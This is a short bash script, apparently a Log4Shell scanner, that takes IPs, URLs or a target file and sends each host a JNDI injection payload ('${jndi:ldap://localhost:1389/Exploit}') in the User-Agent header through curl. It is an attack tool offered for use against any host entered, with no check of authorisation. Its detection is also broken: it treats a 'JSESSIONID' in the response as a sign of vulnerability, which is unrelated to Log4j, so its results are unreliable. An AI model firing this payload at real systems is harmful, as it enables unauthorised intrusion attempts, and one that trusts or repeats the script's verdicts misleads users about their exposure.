#! /bin/bash


#	░█████╗░██╗░░░██╗██████╗░███████╗██████╗░░█████╗░███╗░░██╗███████╗
#	██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗██╔══██╗████╗░██║██╔════╝
#	██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝██║░░██║██╔██╗██║█████╗░░
#	██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗██║░░██║██║╚████║██╔══╝░░
#	╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║╚█████╔╝██║░╚███║███████╗
#	░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝╚══════╝




# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Prompt for input type
echo -e "${YELLOW}Enter 'ip', 'url', or 'file' to specify the target:${NC}"
read input_type

# The target(s)
targets=()

# Process based on the input type
if [ "$input_type" = "ip" ] || [ "$input_type" = "url" ]; then
    echo -e "${YELLOW}Enter the ${input_type}:${NC}"
    read target
    targets+=("$target")
elif [ "$input_type" = "file" ]; then
    echo -e "${YELLOW}Enter the full path to the file:${NC}"
    read file_path
    while IFS= read -r line; do
        targets+=("$line")
    done < "$file_path"
else
    echo -e "${RED}Invalid option. Please enter 'ip', 'url', or 'file'.${NC}"
    exit 1
fi

# The payload
payload='${jndi:ldap://localhost:1389/Exploit}'

# Scan each target
for target in "${targets[@]}"; do
    echo -e "${YELLOW}Checking ${target}...${NC}"

    # Using curl to send the payload and check the response
    response=$(curl -s -H "User-Agent: $payload" "$target")

    # Check the response for JSESSIONID which might indicate a Log4j-enabled server
    if [[ "$response" == *"JSESSIONID"* ]]; then
        echo -e "${RED}Potential vulnerability detected at ${target}${NC}"
    else
        echo -e "${GREEN}${target} seems not to be vulnerable${NC}"
    fi
done

echo -e "${GREEN}Scan completed.${NC}"
